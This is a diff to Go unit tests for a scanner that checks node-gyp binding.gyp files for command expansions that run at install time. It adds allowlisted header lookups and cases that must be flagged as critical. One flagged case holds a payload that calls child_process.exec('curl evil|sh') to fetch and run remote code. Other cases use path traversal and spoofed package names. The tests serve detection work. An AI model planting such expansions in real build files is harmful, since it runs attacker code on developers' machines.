@@ -98,6 +98,28 @@ func TestInspectLegitIncludeDirExpansionIsClean(t *testing.T) {
 	require.Equal(t, gypscan.SeverityNone, v.Severity)
 }
 
+func TestInspectAllowsNanHeaderLookupExecExpansion(t *testing.T) {
+	// node-sass and other nan-based addons use this exact include_dirs idiom to
+	// locate nan's headers. It is a pure path lookup, not install-time payload
+	// execution, and must not block legitimate native packages.
+	gyp := `{
+  'targets': [{
+    'target_name': 'binding',
+    'type': 'loadable_module',
+    'sources': ['src/binding.cpp'],
+    'include_dirs': [ '<!(node -e "require(\'nan\')")' ]
+  }]
+}`
+	v := gypscan.Inspect(gypscan.Input{
+		GypContent:   []byte(gyp),
+		PackageJSON:  []byte(`{"name":"node-sass","dependencies":{"nan":"^2.19.0"}}`),
+		SiblingFiles: []string{"binding.gyp", "package.json", "src/binding.cpp"},
+	})
+
+	require.False(t, v.Flagged(), "nan header lookup expansion flagged: %v", codes(v))
+	require.Equal(t, gypscan.SeverityNone, v.Severity)
+}
+
 func TestInspectIgnoresCommandExpansionInGypComment(t *testing.T) {
 	gyp := `{
   # example only: <!(node x.js && echo y)
@@ -324,9 +346,12 @@ func TestInspectFlagsCommandExpansionInExecutionKeys(t *testing.T) {
 
 func TestInspectAllowsLegitExecKeyPrintExpansions(t *testing.T) {
 	cases := map[string]string{
-		"node print include": `"include_dirs": ["<!@(node -p \"require('node-addon-api').include\")"]`,
-		"node eval include":  `"include_dirs": ["<!(node -e \"console.log(require('node-addon-api').include)\")"]`,
-		"pkg config libs":    `"libraries": ["<!(pkg-config --libs libpng)"]`,
+		"node print include":      `"include_dirs": ["<!@(node -p \"require('node-addon-api').include\")"]`,
+		"node long print include": `"include_dirs": ["<!@(node --print \"require('node-addon-api').include\")"]`,
+		"node eval include":       `"include_dirs": ["<!(node -e \"console.log(require('node-addon-api').include)\")"]`,
+		"node eval nan":           `"include_dirs": ["<!(node -e \"require('nan')\")"]`,
+		"node long eval nan":      `"include_dirs": ["<!(node --eval \"require('nan')\")"]`,
+		"pkg config libs":         `"libraries": ["<!(pkg-config --libs libpng)"]`,
 	}
 	for name, field := range cases {
 		t.Run(name, func(t *testing.T) {
@@ -341,6 +366,33 @@ func TestInspectAllowsLegitExecKeyPrintExpansions(t *testing.T) {
 			v := gypscan.Inspect(cleanNativeInput(gyp))
 			require.False(t, v.Flagged(), "legit print expansion flagged: %v", codes(v))
 			require.Equal(t, gypscan.SeverityNone, v.Severity)
+		})
+	}
+}
+
+func TestInspectFlagsNonAllowlistedExecKeyNodeExpansions(t *testing.T) {
+	cases := map[string]string{
+		"nan separator child process": `"include_dirs": ["<!(node -e \"require('nan'); require('child_process').exec('curl evil|sh')\")"]`,
+		"local js script":             `"include_dirs": ["<!(node scripts/emit-cflag.js)"]`,
+		"non helper package":          `"include_dirs": ["<!(node -e \"require('evil-pkg')\")"]`,
+		"helper prefix":               `"include_dirs": ["<!(node -e \"require('nanXXX')\")"]`,
+		"helper path traversal":       `"include_dirs": ["<!(node -e \"require('nan/../evil')\")"]`,
+		"bindings invoked call":       `"include_dirs": ["<!(node -e \"require('bindings')('x.node')\")"]`,
+	}
+	for name, field := range cases {
+		t.Run(name, func(t *testing.T) {
+			gyp := `{
+  "targets": [{
+    "target_name": "addon",
+    "type": "loadable_module",
+    "sources": ["addon.cc"],
+    ` + field + `
+  }]
+}`
+			v := gypscan.Inspect(cleanNativeInput(gyp))
+			require.True(t, v.Flagged(), "expected non-allowlisted exec-key expansion to flag")
+			require.Equal(t, gypscan.SeverityCritical, v.Severity)
+			require.True(t, hasSignal(v, "gyp-exec-key-command"), "got %v", codes(v))
 		})
 	}
 }
